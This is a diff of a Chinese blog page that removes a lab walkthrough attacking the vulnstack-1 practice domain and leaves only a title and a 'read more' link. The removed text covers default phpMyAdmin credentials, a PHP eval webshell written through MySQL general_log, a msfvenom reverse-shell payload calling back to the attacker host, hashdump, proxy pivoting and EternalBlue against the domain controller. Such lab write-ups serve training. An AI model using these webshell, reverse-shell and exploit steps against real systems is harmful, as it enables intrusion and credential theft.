@@ -310,66 +310,8 @@ var _hmt = _hmt || [];
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h4 id="简单的介绍"><a href="#简单的介绍" class="headerlink" title="简单的介绍"></a>简单的介绍</h4><p>最近比较闲就下了一个vulnstack的靶机来玩玩，正好7月份要去安恒实习，乘着这个时候好好把渗透能力再提升一下</p>
-<h4 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h4><p>vulnstack 1的红日安全主机，web服务器是win7 dc是win2008 同时还有一台域成员主机win7是暴露在外网的同时还有一块连接内网的网卡网段是192.168.52.0/24 外网段是219.217.199.0/24<br>kali作为攻击机为 219.217.199.76</p>
-<hr>
-<h4 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>nmap 网络主机发现<br>nmap -sS 219.217.199.0/24<br>发现主机 219.217.199.112<br>访问发现是phpstudy搭建的环境—-&gt;提示有phpmyadmin<br>访问phpmyadmin—&gt;phpstudy mysql的密码默认为root root尝试登陆 成功</p>
-<h5 id="phpmyadmin-getshell"><a href="#phpmyadmin-getshell" class="headerlink" title="phpmyadmin getshell"></a>phpmyadmin getshell</h5><p>在phpstudy的首页发现了网站的绝对路径C:/phpstudy/www/<br>现在为mysql root权限可写知道网站绝对路径—-&gt;sql写文件<br>select ‘<?php eval($_POST['f1oat']); ?>‘ into outfile ‘C:/phpstudy/www/HACK.php’<br>但是mysql开启了secure_file_prive=null 无法写入shell<br> select @@secure_file_priv   – 查询secure_file_priv<br> – secure_file_priv=NULL,禁止导入导出<br> – secure_file_priv=’’,不限制导入导出<br> – secure_file_priv=/path/,只能向指定目录导入导出<br>  select load_file(‘c:/phpinfo.php’);        – 读取文件<br> select ‘123’ into outfile ‘c:/shell.php’;  – 写入文件<br>于是想到mysql查询之后会自动记录日志<br>查询日志信息:<br> show variables like ‘%general%’;<br>  set global general_log = “ON”;    – 打开日志保存<br> set global general_log_file = “C:/phpstudy/WWW/123.php”;  – 设置日志保存路径,需先得知网站物理路径,否则即使写入了Shell也无法通过URL连接<br> sql执行<br> select ‘<?php eval($_POST['f1oat']); ?>‘ from table_name;<br> 蚁剑连接 219.217.199.112/123.php 密码f1oat</p>
-<h5 id="使用msf后续渗透"><a href="#使用msf后续渗透" class="headerlink" title="使用msf后续渗透"></a>使用msf后续渗透</h5><p>上传反弹shell的exe木马<br>msfvenom -p windows/meterpreter/reverse_tcp lhost=219.217.199.76 lport=4444 -f exe &gt;  payload.exe<br>上传到蚁剑终端执行payload.exe<br>msf设置监听反弹shell<br>msf5&gt; use exploit/multi/handler<br>msf5&gt; set payload windows/meterpreter/reverse_tcp<br>msf5&gt; show options<br>msf5&gt; set lhost 219.217.199.76<br>msf5&gt; exploit<br>接收到反弹shell<br>ps获取系统进程，migrate进行进程迁移防止连接不稳定断开<br>getuid<br>god\administrator<br>尝试msf getsystem提权<br>msf5&gt;getsystem<br>提权成功成为system</p>
-<h5 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h5><p>为了进一步渗透内网，进行内网的信息收集<br>ipconfig 查看ip<br>tasklist 查看进程<br>arp 收集内网交互的一些ip方便进行下一步渗透<br>net view \domain 查看域<br>hashdump<br>meterpreter &gt; hashdump<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>meterpreter &gt; arp</p>
-<h1 id="ARP-cache"><a href="#ARP-cache" class="headerlink" title="ARP cache"></a>ARP cache</h1><pre><code>IP address       MAC address        Interface
-----------       -----------        ---------
-169.254.255.255  ff:ff:ff:ff:ff:ff  24
-192.168.52.138   00:0c:29:3f:5d:a9  11
-192.168.52.255   ff:ff:ff:ff:ff:ff  11
-219.217.199.16   18:31:bf:43:84:78  25
-219.217.199.76   08:00:27:5c:65:26  25
-219.217.199.254  00:1a:a9:c3:58:43  25
-219.217.199.255  ff:ff:ff:ff:ff:ff  25
-224.0.0.2        00:00:00:00:00:00  1
-224.0.0.2        01:00:5e:00:00:02  24
-224.0.0.2        01:00:5e:00:00:02  11
-224.0.0.2        01:00:5e:00:00:02  14
-224.0.0.2        01:00:5e:00:00:02  22
-224.0.0.2        01:00:5e:00:00:02  23
-224.0.0.2        01:00:5e:00:00:02  25
-224.0.0.22       00:00:00:00:00:00  1
-224.0.0.22       01:00:5e:00:00:16  24
-224.0.0.22       01:00:5e:00:00:16  11
-224.0.0.22       01:00:5e:00:00:16  14
-224.0.0.22       01:00:5e:00:00:16  22
-224.0.0.22       01:00:5e:00:00:16  23
-224.0.0.22       01:00:5e:00:00:16  25
-224.0.0.252      01:00:5e:00:00:fc  24
-224.0.0.252      01:00:5e:00:00:fc  11
-224.0.0.252      01:00:5e:00:00:fc  25
-239.255.255.250  00:00:00:00:00:00  1
-239.255.255.250  01:00:5e:7f:ff:fa  11
-239.255.255.250  01:00:5e:7f:ff:fa  25
-255.255.255.255  ff:ff:ff:ff:ff:ff  24
-255.255.255.255  ff:ff:ff:ff:ff:ff  25</code></pre>
-<p>发现有192端以及219段<br>192段应该是内网网络了<br>ps查看进程的时候已经知道了域名称为GOD</p>
-<h5 id="设置代理进行跨网段进行信息收集"><a href="#设置代理进行跨网段进行信息收集" class="headerlink" title="设置代理进行跨网段进行信息收集"></a>设置代理进行跨网段进行信息收集</h5><p>msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a<br>msf5 auxiliary(server/socks4a) &gt; show options</p>
-<p>Module options (auxiliary/server/socks4a):</p>
-<p>   Name     Current Setting  Required  Description</p>
-<hr>
-<p>   SRVHOST  0.0.0.0          yes       The address to listen on<br>   SRVPORT  1080             yes       The port to listen on.</p>
-<p>msf5&gt;sessions -i 1<br>meterpreter&gt; run autoroute -s 192.168.52.0/24 进行路由绑定<br>回到kali终端<br>vi /etc/proxychains.conf<br>添加<br>socks4 219.217.199.76 1080</p>
-<hr>
-<p>proxychains 对138主机进行端口扫描</p>
-<p>Auxiliary action:</p>
-<p>   Name   Description</p>
-<hr>
-<p>   Proxy  Run SOCKS4a proxy</p>
-<p>root@kali:~# proxychains3 nmap -sT -Pn 192.168.52.138 -p 21,22,80,89,161,389,443,445,1443,1521,3306,3389,6379,8000,8080,9000 –open<br>ProxyChains-3.1 (<a target="_blank" rel="noopener" href="http://proxychains.sf.net/">http://proxychains.sf.net</a>)<br>Starting Nmap 7.80 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-03-14 23:40 EDT<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:445-&lt;&gt;&lt;&gt;-OK<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:80-&lt;&gt;&lt;&gt;-OK<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:443-&lt;–timeout<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:8080-&lt;–timeout<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:3389-&lt;–timeout<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:22-&lt;–timeout<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:3306-&lt;–timeout<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:21-&lt;–timeout<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:389-&lt;&gt;&lt;&gt;-OK<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:1443-&lt;–timeout<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:1521-&lt;–timeout<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:9000-&lt;–timeout<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:6379-&lt;–timeout<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:8000-&lt;–timeout<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:89-&lt;–timeout<br>|S-chain|-&lt;&gt;-219.217.199.76:1080-&lt;&gt;&lt;&gt;-192.168.52.138:161-&lt;–timeout<br>Nmap scan report for 192.168.52.138<br>Host is up (0.11s latency).<br>Not shown: 13 closed ports<br>PORT    STATE SERVICE<br>80/tcp  open  http<br>389/tcp open  ldap<br>445/tcp open  microsoft-ds<br>发现445端口开放可能存在永恒之蓝漏洞<br>msf5&gt;search ms17_010<br>msf5&gt;use auxiliary/scanner/smb/smb_ms17_010<br>msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</p>
-<p>Module options (auxiliary/scanner/smb/smb_ms17_010):</p>
-<p>   Name         Current Setting                   Required  Description</p>
-<hr>
-<p>   CHECK_ARCH   true                              no        Check for architecture on vulnerable hosts<br>   CHECK_DOPU   true                              no        Check for DOUBLEPULSAR on vulnerable hosts<br>   CHECK_PIPE   false                             no        Check for named pipe on vulnerable hosts<br>   NAMED_PIPES  /opt/metasploit-framework/embedd  yes       List of named pipes to check<br>                ed/framework/data/wordlists/name<br>                d_pipes.txt<br>   RHOSTS                                         yes       The target host(s), range CIDR identifier, or hosts file w<br>                                                            ith syntax ‘file:<path>‘<br>   RPORT        445                               yes       The SMB service port (TCP)<br>   SMBDomain    .                                 no        The Windows domain to use for authentication<br>   SMBPass                                        no        The password for the specified username<br>   SMBUser                                        no        The username to authenticate as<br>   THREADS      1                                 yes       The number of concurrent threads (max one per host)</p>
-<p>msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.52.138<br>rhosts =&gt; 192.168.52.138<br>msf5 auxiliary(scanner/smb/smb_ms17_010) &gt;exploit<br>发现存在永恒之蓝漏洞<br>msf5 auxiliary(scanner/smb/smb_ms17_010)&gt;use exploit/windows/smb/ms17_010_eternalblue<br>设置到rhosts —&gt;exploit<br>拿下DC</p>
-<hr>
-<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>有的时候因为网络连通的问题永恒之蓝没有利用成功需要多尝试几次，因为时间和网络的原因没有做后续的权限维持，过几天打算用Cobalt Strike再次渗透一次。做一个黄金票据以及域成员的横向移动的渗透pth等<br>tips:<br>需要用的技术有<br>sql语句写入shell<br>phpmyadmin 日志getshell<br>msf生成反弹shell木马<br>msf 绑定路由进行跨网段的渗透测试<br>以及使用msf的渗透模块进行对域控的渗透等</p>
-
+              <h1 id="vulnstack-域渗透"><a href="#vulnstack-域渗透" class="headerlink" title="vulnstack-域渗透"></a>vulnstack-域渗透</h1>
+          
       
     </div>
     
@@ -382,6 +324,10 @@ var _hmt = _hmt || [];
 
 
       
+      
+        <p class="article-more-link">
+          <a   href="/2021/03/15/vulnstack-1/#more">查看更多 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
